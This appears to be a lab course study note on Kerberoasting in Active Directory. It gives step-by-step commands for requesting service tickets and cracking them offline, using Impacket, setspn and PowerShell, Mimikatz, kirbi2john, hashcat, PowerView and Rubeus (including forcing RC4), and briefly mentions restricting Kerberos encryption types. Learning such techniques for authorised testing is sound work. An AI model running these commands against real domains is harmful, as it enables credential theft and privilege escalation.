- [Kerberoasting](#kerberoasting)
- [Kerberoasting - from Linux](#kerberoasting---from-linux)
- [Kerberoasting - from Windows](#kerberoasting---from-windows)
        - [Kerberoasting - Semi Manual method](#kerberoasting---from-windows)
        - [Automated / Tool Based Route](#automated--tool-based-route)

## Kerberoasting
- **Overview**
    - Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.
    - This attack targets Service Principal Names (SPN) accounts. 
    - SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.
    - All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

- Depending on your position in a network, this attack can be performed in multiple ways:

    - From a non-domain joined Linux host using valid domain user credentials.
    - From a domain-joined Linux host as root after retrieving the keytab file.
    - From a domain-joined Windows host authenticated as a domain user.
    - From a domain-joined Windows host with a shell in the context of a domain account.
    - As SYSTEM on a domain-joined Windows host.
    - From a non-domain joined Windows host using runas /netonly.



> [!NOTE]
> A prerequisite to perform Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

### Kerberoasting - from Linux
#### Kerberoasting with GetUserSPNs.py
- We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket.

```bash
# Listing SPN Accounts with GetUserSPNs.py
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

```

- We can now pull all TGS tickets for offline processing using the `-request` flag.

```bash
# Requesting all TGS Tickets
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Requesting a Single TGS ticket
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# -outputfile flag to write the TGS tickets to a file


# Cracking the ticket offline with hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

### Kerberoasting - from Windows
#### Kerberoasting - Semi Manual method

```bat
# Enumerating SPNs with built-in setspn.exe
C:\htb> setspn.exe -Q */*

```

- Using PowerShell, we can request TGS tickets for an account and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz.

```powershell
# Targeting a Single User
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

```

- **Explanation**
    - The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
    - The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
    - `System.IdentityModel` is a namespace that contains different classes for building security token services
    - We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
    - We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session


- We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

```powershell
# Retrieving All Tickets Using setspn.exe
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }


```
- Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

```bat 
# Extracting Tickets from Memory with Mimikatz
mimikatz # base64 /out:true

mimikatz # kerberos::list /export  

```

- If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. 

```bash
# Preparing the Base64 Blob for Cracking
echo "<base64 blob>" |  tr -d \\n 


# Placing the Output into a File as .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Extracting the Kerberos Ticket using kirbi2john.py
kirbi2john.py sqldev.kirbi

# Modifiying resulted crack_file for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Cracking the Hash with Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 



```

- We can place the above single line of output into a file and convert it back to a `.kirbi` file using the base64 utility.

#### Automated / Tool Based Route
```powershell
# Using PowerView to Extract TGS Tickets
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation



# Using Rubeus
# Using the /stats Flag
PS C:\htb> .\Rubeus.exe kerberoast /stats

# Request tickets for accounts with the admincount attribute set to 1. Using the /nowrap Flag
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Using /tgtdeleg flag
PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:forend /nowrap
```

- To avoid retrieve `AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96`, we can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.
- The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility.

> [!NOTE]
> This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account.

- It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos

